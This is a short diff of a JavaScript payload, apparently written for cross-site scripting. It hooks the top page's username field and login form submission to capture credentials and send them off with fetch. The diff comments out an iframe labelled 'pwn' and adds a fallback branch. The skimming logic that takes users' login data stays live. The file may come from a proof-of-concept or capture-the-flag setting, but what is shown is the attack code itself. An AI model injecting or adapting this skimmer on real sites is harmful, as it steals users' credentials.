@@ -1,13 +1,13 @@
 // alert('Wow! Origin: '+location.origin+'\nUrl: '+top.location.href+'?');
 console.log('Wow! Origin: '+location.origin+'\nUrl: '+top.location.href+'?');
 
-f = document.createElement("iframe");
-f.id = "pwn";
-f.src = "/";
+// f = document.createElement("iframe");
+// f.id = "pwn";
+// f.src = "/";
 let user;
 let pw;
 
-f.onload = () => {
+// f.onload = () => {
   top.username.addEventListener('change', e => user = e.target.value);
   // top.password.addEventListener('change', e => user = e.target.value);
   top.document.forms[0].addEventListener('submit', () => {
@@ -25,8 +25,11 @@ f.onload = () => {
       }).then(resp => {
         console.log(resp.json());
       })
+    } else {
+      console.log("not doing anything");
+      top.document.forms[0].elements[0];
     }
   })
-};
+// };
 
 document.body.appendChild(f);
